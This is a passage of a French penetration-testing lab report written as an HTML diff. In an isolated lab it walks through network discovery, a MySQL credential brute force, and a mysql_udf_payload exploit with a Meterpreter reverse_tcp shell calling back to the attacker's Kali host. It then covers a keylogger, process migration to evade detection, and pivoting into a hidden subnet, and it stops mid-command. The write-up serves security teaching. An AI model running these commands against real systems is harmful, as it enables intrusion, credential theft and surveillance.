+        <!---->
+        <p>Ces règles de pare-feu permettent de: 
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>Protéger les machines internes contre des connexions non sollicitées;</li>
+            <li><strong>Filtrer précisément les flux de sortie</strong>;</li>
+            <li><strong>Contrôler tout le trafic</strong> via une seule passerelle (pfSense), notamment dans un scénario de
+              pentest en environnement segmenté.</li>
+          </ul>
+          Il est possible d’ajouter manuellement des règles dans le fichier <strong>/etc/pf.conf</strong>.
+          Après avoir écrit ou modifié ce fichier, on recharge les règles avec:
+        </p>
+        <!--Code-->
+        <!--CODE-->
+        <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ pfctl -f /etc/pf.conf
+            </code></pre>
+          </figure>
+        </div>
+        <!---->
+        <!--CE-->
+        <!--CE9-->
+        <img src="/assets/CE10-CwTNlp2E.png" width="700" />
+        <figcaption>
+          Figure 31 – Chargement des nouvelles règles de trafic entrant et sortant sur la machine pfSense
+        </figcaption>
+        <!---->
+        <p>Les règles définies dans <strong>/etc/pf.conf</strong> ne sont pas celles utilisées par pfSense En
+          effet, avec pfSense, les règles configurées via l’interface web ne sont pas stockées dans <strong>/etc/pf.conf</strong>.
+          Elles sont en réalité générées dynamiquement à partir du fichier <strong>/conf/config.xml</strong>, et chargées
+          automatiquement via les outils internes de pfSense. Cela signifie que: 
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>Le fichier <strong>/etc/pf.conf</strong> est vide ou minimal par défaut;</li>
+            <li>Les règles actuellement actives (affichées par pfctl -sr) ne proviennent pas de <strong>pf.conf</strong>;</li>
+            <li>Si l’on charge un fichier <strong>pf.conf</strong> avec <strong>pfctl -f</strong>, cela remplace les règles dynamiques en mémoire;</li>
+            <li><strong>Ce changement n’est pas persistant: au redémarrage, pfSense réinitialise les règles à partir de sa
+              configuration interne.</strong></li>
+          </ul>
+        </p>
+
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <!---->
+      <div class="section content-section" id="arp-scan">
+        <h2>🔍 Arp-scan: Découverte du réseau</h2>
+        <!----->
+        <h3>1. Découverte du réseau avec arp-scan</h3>
+        <p>
+          L’outil <strong>arp-scan</strong> permet d’identifier les hôtes actifs sur un réseau local en envoyant des requêtes ARP.
+          Cette analyse fournit, pour chaque machine détectée, son adresse IP ainsi que son adresse MAC.  
+          Selon la documentation <a href="https://linux.die.net/man/1/arp-scan">officielle</a>, cet outil est particulièrement utile pour détecter 
+          des hôtes qui pourraient ne pas répondre aux sondes ICMP ou TCP classiques.
+        </p>
+        <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ sudo arp-scan -l
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE-->
+        <img src="/assets/CE1-CRl7_JuQ.png" width="700" />
+        <figcaption>
+          Figure 32 – Analyse du réseau avec <strong>Arp-scan</strong>
+        </figcaption>
+        <p>
+          D’après les résultats, l’adresse <strong>10.10.10.2</strong> correspond à une machine présente sur le réseau, tandis que l’adresse 
+          <strong>10.10.10.128</strong>semble être celle du routeur, ce qui est suggéré par les mentions <em>(locally administered)</em> et <em>(DUP: 2)</em>.
+        </p>
+        <!----->
+        <!----->
+
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <!---->
+      <div class="section content-section" id="nmap-scan">
+        <h2>⚙️Lancement de Metasploit et 🔍Scan de reconnaissance avec Nmap</h2>
+        <h3>1. ⚙️ <emp>Metasploit</emp>: Prise en main</h3>
+        <p>
+          Lors du premier lancement de Metasploit, il est recommandé d’associer une base de données afin
+          de pouvoir stocker les résultats des analyses réseau et les réutiliser directement dans le framework. Pour
+          cela, il faut démarrer le service PostgreSQL, puis initialiser la base avec les commandes suivantes:
+        </p>
+        <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ sudo systemctl start postgresql</code></pre>
+          </figure>
+        </div>
+        <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ sudo msfdb init</code></pre>
+          </figure>
+        </div>
+        <!--CE-->
+        <img src="/assets/CE2-KjXpgcsA.png" width="700" />
+        <figcaption>
+          Figure 33 – Initialisation de la base de données Metasploit
+        </figcaption>
+        <!---->
+        <p>
+          On peut ensuite lancer Metasploit à l’aide de la commande suivante:
+        </p>
+        <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ sudo msfconsole</code></pre>
+          </figure>
+        </div>
+        <!--CE-->
+        <img src="/assets/CE4-C68j-7oQ.png" width="700" />
+        <figcaption>
+          Figure 34 – Démarrage du framework Metasploit
+        </figcaption>
+      <!---->
+      <h3>2. 🔍Scan de reconnaissance avec Nmap</h3>
+      <p>On vérifie l’état de la base de données avec:</p>
+      <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">msf6 > db_status
+</code></pre>
+          </figure>
+        </div>
+        <!--CE-->
+        <img src="/assets/CE5-DT862inC.png" width="700" />
+        <figcaption>
+          Figure 35 – La base de donnée est active
+        </figcaption>
+        <p>Les options utilisées pour ce scan sont:<p></p>
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>-sS: scan SYN furtif</li>
+            <li>-sV: détection des versions</li>
+            <li>-O: détection du système d’exploitation</li>
+            <li>-Pn: désactivation de la détection d’hôtes</li>
+            <li>-T1: vitesse réduite pour plus de discrétion</li>
+          </ul>
+        <p>
+          Le scan cible les ports 21, 22, 80, 443, 3306:
+        </p>
+        <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">msf6 > db_nmap -sS -sV -O -Pn -T1 -p 21,22,80,443,3306 10.10.10.2</code></pre>
+          </figure>
+        </div>
+        <!--CE-->
+        <img src="/assets/CE6-qKGZJVgb.png" width="700" />
+        <figcaption>
+          Figure 36 – Scan des services de la machine 10.10.10.2 avec Nmap
+        </figcaption>
+        <p>
+          D’après les résultats, le port 443 (HTTPS) est fermé, tandis que les ports 21 (FTP), 22 (SSH),
+          80 (HTTP) et 3306 (MySQL) sont ouverts.
+          Le système d’exploitation est possiblement un environnement Windows, cependant la version de
+          cet environnement manque de précision. Il pourrait s’agir de Windows Vista, Windows 7 ou de
+          Windows Server 2008 R2.vg
+        </p>
+        <p>
+          Avant de poursuivre l’exploitation, l’attaquant doit confirmer la version exacte du système. Cette
+          étape est essentielle pour sélectionner un payload compatible avec l’architecture et le service
+          ciblé.
+        </p>
+        <!---->
+        <h3>3. Nature du système d’exploitation de la machine cible</h3> 
+        <p>La commande <strong>hosts</strong> permet au pirate de connaître le nom de la machine cible.</p>
+        <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">msf6 > hosts</code></pre>
+          </figure>
+        </div>
+        <!--CE-->
+        <img src="/assets/CE7-BXbh7443.png" width="700" />
+        <figcaption>
+          Figure 37 – Découverte du nom et du système d'exploitation à l'aide de la commande hosts
+        </figcaption>
+        <h3>4. Découverte des vulnérabilités de la machine cible</h3>
+        <p>La commande <strong>services</strong> permet au pirate de connaître le status des principaux ports de 
+          communications de la machine cible</p>
+        <!---CODE-->   
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">msf6 > services</code></pre>
+          </figure>
+        </div>
+        <!--CE-->
+        <img src="/assets/CE8-CYXXwpPM.png" width="700" />
+        <figcaption>
+          Figure 38 – Découverte du nom et du système d'exploitation à l'aide de la commande services
+        </figcaption>
+        <p>La commande hosts et la commande services nous révèle que l’ordinateur tourne sous Windows
+          2008 Server et que des infiltrations pour être réalisés sur:</p>
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>Microsoft ftpd : le serveur ftp</li>
+            <li>OpenSSH 7.1 protocol 2.0 : le serveur ssh</li>
+            <li>MySQL 5.5.20-log : la base de données MySQL</li>
+          </ul>
+        <!---->
+        <p>Le Hacker se décide en faveur d’une infiltration du système en tentant de deviner les identifiants du
+        serveur MySQL présent sur le port 3306.
+        </p>
+        <h2>Accès au terminal de commandes de l’ordinateur cible</h2>
+        <h3>1. Paramétrage et lancement du module <code>mysql_login</code></h3>
+          <p>
+            Avec la commande <code>use</code>, l’attaquant sélectionne le module <code>mysql_login</code>,
+            utilisé pour réaliser une attaque par brute force sur le serveur MySQL.
+          </p>
+
+            <!---CODE-->   
+            <div class="center">
+              <figure class="ray-code">
+                <header class="ray-header">
+                  <span class="dot red"></span>
+                  <span class="dot yellow"></span>
+                  <span class="dot green"></span>
+                  <span class="title">bash</span>
+                </header>
+                <pre><code class="language-bash">msf6 > use auxiliary/scanner/mysql/mysql_login</code></pre>
+              </figure>
+            </div>
+            <p>La commande <strong>show</strong> options affiche les paramètres configurables du module.</p>
+            <!---CODE-->   
+            <div class="center">
+              <figure class="ray-code">
+                <header class="ray-header">
+                  <span class="dot red"></span>
+                  <span class="dot yellow"></span>
+                  <span class="dot green"></span>
+                  <span class="title">bash</span>
+                </header>
+                <pre><code class="language-bash">msf6 > show options</code></pre>
+              </figure>
+            </div>
+            <!--CE-->
+            <img src="/assets/CE9-Dl8t5z1A.png" width="700" />
+            <figcaption>
+              Figure 39 – Utilisation du module mysql_login
+            </figcaption>
+            <p>Il y a 4 paramètres dont on doit tenir compte ici:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+              <li><strong>PASS_FILE:</strong> le chemin vers le dictionnaire de mots de passe utilisé pour l’attaque.</li>
+              <li><strong>RHOSTS:</strong> l’adresse IP de la cible (10.10.10.2).</li>
+              <li><strong>THREADS:</strong> le nombre de threads pour paralléliser l’attaque (et donc sa vitesse).</li>
+              <li><strong>VERBOSE</strong> mode verbeux, qui peut être mis sur false pour réduire la quantité de sortie affichée.</li>
+            </ul>
+            <!---CODE-->   
+            <div class="center">
+              <figure class="ray-code">
+                <header class="ray-header">
+                  <span class="dot red"></span>
+                  <span class="dot yellow"></span>
+                  <span class="dot green"></span>
+                  <span class="title">bash</span>
+                </header>
+                <pre><code class="language-bash">msf6 auxiliary(scanner/mysql/mysql_login)> set PASS_FILE /usr/share/wordlists/fasttrack.txt
+msf6 auxiliary(scanner/mysql/mysql_login)> set RHOSTS 10.10.10.2
+msf6 auxiliary(scanner/mysql/mysql_login)> set THREADS 10
+msf6 auxiliary(scanner/mysql/mysql_login)> set verbose false
+msf6 auxiliary(scanner/mysql/mysql_login)> exploit</code></pre>
+              </figure>
+            </div>
+            <!--CE-->
+            <img src="/assets/CE10-CDmLfZ3n.png" width="700" />
+            <figcaption>
+              Figure 40 – Utilisation du module mysql_login
+            </figcaption>
+            <p>
+              D’après les résultats, l’attaque par BruteForce est un succès : l’utilisateur est root et aucun
+              mot de passe n’est configuré. Le manque de vigilance de l’administrateur de la machine cible
+              offre une porte dérobée au hackeur.
+            </p>
+            <p>La commande creds permet d’afficher de manière synthétique les identifiants récupérés.</p>
+            <!---CODE-->   
+            <div class="center">
+              <figure class="ray-code">
+                <header class="ray-header">
+                  <span class="dot red"></span>
+                  <span class="dot yellow"></span>
+                  <span class="dot green"></span>
+                  <span class="title">bash</span>
+                </header>
+                <pre><code class="language-bash">msf6 auxiliary(scanner/mysql/mysql_login)> creds</code></pre>
+              </figure>
+            </div>
+            <!--CE-->
+            <img src="/assets/CE11-BjzbT3pM.png" width="700" />
+            <figcaption>
+              Figure 41 – Affichage des informations d’identification avec la commande creds
+            </figcaption>
+            <!---->
+            <h3>2. Paramétrage et lancement du module <code>mysql_udf_payload</code></h3>
+            <!---->
+            <p>Maintenant que l’attaquant dispose des identifiants, il peut exploiter le service MySQL pour
+              exécuter du code sur la machine cible. Le module <strong>mysql_udf_payload</strong> permet d’injecter une
+              fonction utilisateur (UDF) malveillante afin d’obtenir un accès Meterpreter.
+            </p>
+            <p>
+              Les paramètres essentiels sont:
+            </p>
+              <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+                <li><strong>PAYLOAD:</strong> le code malveillant à exécuter, ici windows/meterpreter/reverse_tcp.
+                <li><strong>LHOST:</strong> l’adresse IP de la machine attaquante (ici, Kali Linux : 10.10.10.100).
+                <li><strong>LPORT:</strong> le port d’écoute sur la machine attaquante (ici 443).
+                <li><strong>RHOSTS:</strong> l’adresse IP de la cible (10.10.10.2).
+                <li><strong>PASSWORD:</strong> le mot de passe sera laissé vide, comme révélé par l’attaque précédente.
+              </ul>
+            <!---CODE-->   
+            <div class="center">
+              <figure class="ray-code">
+                <header class="ray-header">
+                  <span class="dot red"></span>
+                  <span class="dot yellow"></span>
+                  <span class="dot green"></span>
+                  <span class="title">bash</span>
+                </header>
+                <pre><code class="language-bash">msf6 auxiliary(scanner/mysql/mysql_login)> back
+msf6 > use exploit/multi/mysql/mysql_udf_payload
+msf6 exploit(multi/mysql/mysql_udf_payload) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/mysql/mysql_udf_payload)> set LHOST 10.10.10.100
+msf6 exploit(multi/mysql/mysql_udf_payload)> set lport 443
+msf6 exploit(multi/mysql/mysql_udf_payload)> set RHOSTS 10.10.10.2
+msf6 exploit(multi/mysql/mysql_udf_payload)> set PASSWORD ""
+msf6 exploit(multi/mysql/mysql_udf_payload)> exploit</code></pre>
+              </figure>
+            </div>
+            <!--CE-->
+            <img src="/assets/CE12-DWOnyKvj.png" width="700" />
+            <figcaption>
+              Figure 42 – Utilisation du module mysql_udf_payload
+            </figcaption>
+            <!--CE-->
+            <img src="/assets/CE13-DLOld1jA.png" width="700" />
+            <figcaption>
+              Figure 43 – Utilisation du module mysql_udf_payload
+            </figcaption>
+            <p>
+              Grâce à l’exploitation réussie du compte admin MySQL, l’attaquant accède à une session Meterpretrer
+              qui représente un shell inversé lui permettant de contrôlé la machine cible à distance.
+            </p>
+            <!--CE-->
+            <img src="/assets/CE13-DLOld1jA.png" width="700" />
+            <figcaption>
+              Figure 44 – Accès par le hacker à une session Meterpreter
+            </figcaption>
+        <!---->
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <div class="section content-section" id="meterpreter-payload">
+        <h2>🌐 Meterpreter: Payload avancé</h2>
+        
+        <p>Après avoir obtenu une session Meterpreter, l’attaquant cherche à recueillir davantage d’informations
+          sur le système compromis. Il utilise pour cela plusieurs commandes clés:</p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li><strong>screenshot:</strong> capture l’écran de la machine cible. Cette action peut servir de preuve d’intrusion
+            pour l’attaquant ou ses commanditaires.</li>
+        </ul>
+        <!--Code-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > screenshot
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE1-->
+        <img src="/assets/CE1-Dm5FIGjS.png" width="750" />
+        <figcaption>
+          Figure 45 – Capture d’écran obtenue via Meterpreter
+        </figcaption>
+        <!--CE2-->
+        <img src="/assets/CE2-DQahrYS6.png" width="750" />
+        <figcaption>
+          Figure 46 – Capture d’écran obtenue via Meterpreter
+        </figcaption>
+        <!--Code-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > sysinfo
+            </code></pre>
+          </figure>
+        </div>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li><strong>sysinfo:</strong> fournit des informations générales sur le système, comme le nom de l’ordinateur, le
+          domaine, l’architecture et le type de système d’exploitation.</li>
+        </ul>
+  
+        <!--Code-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > sysinfo
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE3-->
+        <img src="/assets/CE3-DYnGr2rO.png" width="750" />
+        <figcaption>
+          Figure 47 – Informations système récupérées avec sysinfo
+        </figcaption>
+
+        <p>
+          La sortie indique que le système d’exploitation est Windows Server 2008 R2 x64, que le nom de
+          l’ordinateur est VAGRANT-2008R2, que la langue est en-US et que le domaine est
+          WORKGROUP. Deux utilisateurs sont connectés, et le Meterpreter utilise un payload x86, ce qui
+          n’empêche pas son exécution sur une architecture 64 bits.
+        </p>
+
+        <p>
+          L’attaquant souhaite ensuite installer un keylogger, c’est-à-dire un enregistreur des frappes
+          clavier, afin de collecter des informations sensibles. Pour ce faire, il doit d’abord injecter son
+          payload dans un processus actif de la mémoire vive.
+        </p>
+        
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>
+            <strong>ps explorer:</strong> selon les auteurs de Metasploit 2nd Edition, cette commande permet non seulement d’identifier
+            les processus présents en mémoire, mais aussi de lire les saisies clavier lorsqu’elle est utilisée dans
+            ce contexte particulier.
+          </li>
+        </ul>
+        <!--Code-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > ps explorer
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE4-->
+        <img src="/assets/CE4-Cv8NEjO-.png" width="750" />
+        <figcaption>
+          Figure 48 – Liste des processus via ps
+        </figcaption>
+        <p>Le processus, explorer.exe (PID 976) est sélectionné car il reste actif tant que l’utilisateur est
+          connecté, il a pour mission de charger le menu démarrer et la barre des tâches. Il s'occupe également 
+          de gérer le bureau et le papier peint.
+        </p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>
+            <strong>migrate:</strong> comme le précisent les auteurs de Metasploit 2nd Edition, cette commande copie le code du
+            payload dans la mémoire virtuelle d’un autre processus, ce qui lui permet de s’exécuter comme
+            un nouveau thread à l’intérieur de ce processus. Cela va permettre d’éviter sa détection.
+            </li>
+        </ul>
+                  
+        <!--Code-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > migrate 976
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE5-->
+        <img src="/assets/CE5-CUEAGsdF.png" width="750" />
+        <figcaption>
+          Figure 49 – Migration du payload vers explorer.exe
+        </figcaption>
+
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li><strong>keylog_recorder</strong> module qui capture les frappes clavier une fois 
+            l’infiltration réalisée.</li>
+        </ul>
+        
+                
+        <!--Code-->
+          <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > run post/windows/capture/keylog_recorder
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE6-->
+        <img src="/assets/CE6-C_0hcZCM.png" width="750" />
+        <figcaption>
+          Figure 50 – Démarrage du keylogger
+        </figcaption>
+        <p>
+          Les données capturées révèlent la rédaction d’un document interne contenant des informations
+          cruciales:
+        </p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>l’existence d’une machine interne distincte où sont stockés les documents recherchés;</li>
+          <li>le transfert de ces fichiers via un serveur FTP;</li>
+          <li>l’absence de connectivité Internet pour cette machine interne, ce qui explique pourquoi elle
+          n’était pas détectable lors du scan initial.</li>
+        </ul>
+        
+        <!--CE7-->
+        <img src="/assets/CE7-C22zV66u.png" width="750" />
+        <figcaption>
+          Figure 51 – Frappes clavier capturées
+        </figcaption>
+
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>
+            <strong>ipconfig:</strong> commande permettant d’afficher la configuration réseau de la machine compromise
+            après l’infiltration.
+          </li>
+        </ul>
+                
+        <!--Code-->
+        <div class="center">
+            <figure class="ray-code">
+              <header class="ray-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="title">bash</span>
+              </header>
+              <pre><code class="language-bash">meterpreter > ipconfig
+              </code></pre>
+            </figure>
+          </div>
+        <!--CE8-->
+        <img src="/assets/CE8-D5HkknQh.png" width="750" />
+          <figcaption>
+            Figure 52 – Affichage des interfaces réseau de la machine cible
+          </figcaption>
+        <p>
+          L’exécution de ipconfig confirme la présence d’un réseau interne caché, accessible depuis la
+          machine compromise, dont l’adresse IP est 192.168.100.2.
+        </p>    
+
+
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <!---->
+      <div class="section content-section" id="analyse-reseau-pivot">
+        <h2>🔍 ANALYSE DU RESEAU MASQUE ET MISE EN PLACE D'UN PIVOT 🌐</h2>
+        <p>
+          L’attaquant met la session Meterpreter en arrière-plan afin de poursuivre l’analyse du réseau
+          interne.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > background
+            </code></pre>
+          </figure>
+        </div>
+        <!---->
+        <h3>1. 🔍 Scan du réseau masqué avec arp_scanner</h3>
+        <!---->
+        <p>D’après la documentation officielle Rapid7<a href="https://www.rapid7.com/db/modules/post/windows/gather/arp_scanner/"></a>, ce module effectue une découverte ARP pour découvrir
+          les hôtes d’un réseau local à partir d’une session Meterpreter.
+          Comme l’outil arp-scan vu précédemment, <strong>arp-scanner</strong> permet d’identifier les hôtes actifs
+          sur un réseau local en envoyant des requêtes ARP et fournira pour chaque machine détectée, son adresse
+          IP ainsi que son adresse MAC.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">
+msf6 > use post/windows/gather/arp_scanner
+msf6 post(windows/gather/arp_scanner) > set SESSION 1
+msf6 post(windows/gather/arp_scanner) > set RHOSTS 192.168.100.2/24
+msf6 post(windows/gather/arp_scanner) > run
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE1-->
+        <img src="/assets/CE1-CrPfOjxu.png" width="750" />
+        <figcaption>
+          Figure 53 – Découverte du réseau interne avec arp_scanner
+        </figcaption>
+        <p>
+          Le scan révèle l’existence d’une machine interne supplémentaire (192.168.100.3), confirmant les
+          informations obtenues grâce au keylogger.
+        </p>
+        <p>Pour accéder à cette machine, qui se trouve sur un réseau différent, l’attaquant devra:</p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>créer une route afin de rendre le réseau interne accessible via la machine compromise;</li>
+          <li>mettre en place un proxy pour rediriger le trafic local (127.0.0.1) vers la machine interne.</li>
+        </ul>
+        
+        <!---->
+        <h3>
+          2. 🌐 Création d’une route entre la machine attaquante et la machine caché via la machine
+                compromise
+        </h3>
+        <!---->
+        <p>Le hacker utilisera les modules <strong>autoroute</strong> et <strong>stock_proxy</strong>.</p>
+        <!---->
+        
+        <p>Selon Rapid7<a href="https://www.rapid7.com/db/modules/post/multi/manage/autoroute/"></a> , le module autoroute permet de gérer le routage des sessions via une session
+          Meterpreter existante. Il permet l’utilisation d’un hôte compromis comme passerelle pour
+          atteindre d’autres sous-réseaux auxquels l’attaquant n’a normalement pas accès. On appelle cette
+          méthode le « pivoting ».</p>
+        <p>En clair, nous allons atteindre la machine cachée sur le réseau interne de l’entreprise en créant
+          une route depuis la machine compromise car c’est elle qui possède une connexion internet avec la
+          machine cible.</p>
+        <p>Pour mener à bien la mise en place de cette liaison, il nous faudra configurer le module autoroute
+          avec les informations suivantes:</p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>Le numéro de session obtenu avec la commande sessions (ici, la session 1);</li>
+          <li>Le sous-réseau (SUBNET) à atteindre (ici 192.168.0.0);</li>
+          <li>Le masque de réseau (NETMASK) exprimé en notation CIDR (/16) plutôt qu’en décimal(255.255.0.0).</li>
+        </ul>
+                
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">
+msf6 post(windows/gather/arp_scanner) > back
+mfs6 > use post/multi/manage/autoroute
+mfs6 post(multi/manage/autoroute) > show options
+mfs6 post(multi/manage/autoroute) > sessions
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE2-->
+        <img src="/assets/CE2-CQreOeTx.png" width="750" />
+        <figcaption>
+          Figure 55 – Création d’une route avec autoroute
+        </figcaption>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">
+mfs6 post(multi/manage/autoroute) > set SESSION 1
+mfs6 post(multi/manage/autoroute) > set SUBNET 192.168.0.0
+mfs6 post(multi/manage/autoroute) > set NETMASK /16
+mfs6 post(multi/manage/autoroute) > set run
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE3-->
+        <img src="/assets/CE3-BR2JePcC.png" width="750" />
+        <figcaption>
+          Figure 56 – Configuration de la route avec autoroute
+        </figcaption>
+        <p>
+          L’option <strong>Autoadd</strong> recherche les sous-réseaux valides dans la table de routage et la liste des
+          interfaces de la session compromise, puis leur ajoute des routes. Ainsi, on obtient deux routes
+          principales:
+        </p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li><strong>10.10.10.0</strong>: Le réseau interne de l’entreprise ayant accès à internet qui a été infiltré par le
+          hackeur et où on retrouve la machine Windows Server 2008 R2 et le routeur Pfsense.</li>
+          <li><strong>192.168.100.0</strong>: Le réseau qui n’a pas accès à internet où seules les machines Windows
+          Server 2008 R2 et Ubuntu 14.04 sont présentes.</li>
+        </ul>
+        
+        <p>Avant de démarrer la configuration du proxy, on s’assure avec la commande ‘route print’ que
+          la route permettant la connexion vers la machine Windows 2008 a bien été ajoutée à la table de
+          routage ainsi que celle permettant l’accès au réseau caché.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">mfs6 auxiliary(server/socks_proxy) > route print
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE4-->
+        <img src="/assets/CE4-Bq2SNfCO.png" width="750" />
+        <figcaption>
+          Figure 57 – Création effective des deux routes
+        </figcaption>
+        <p>
+          Les deux routes sont bien présentes dans la table de routage on peut donc passer à la création du
+          SOCKS_proxy.
+        </p>
+        <!---->
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>SOCKS_proxy</li>
+        </ul>
+        <p>
+          Selon les auteurs de l’ouvrage Metasploit 2nd Edition, il est déconseillé d’installer et d’exécuter
+          Nmap directement sur la machine compromise (ici Windows Server 2008), car cela pourrait
+          attirer l’attention de l’administrateur du système et révéler la présence de l’attaquant.
+        </p>
+        <p>Pour éviter ce risque, il est préférable d’utiliser le protocole SOCKS combiné à ProxyChains
+          afin de faire transiter l’analyse Nmap depuis la machine attaquante (Kali Linux), à travers l’hôte
+          compromis, vers le réseau interne ciblé.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">
+msf6 post(multi/manage/autoroute) > back
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > options
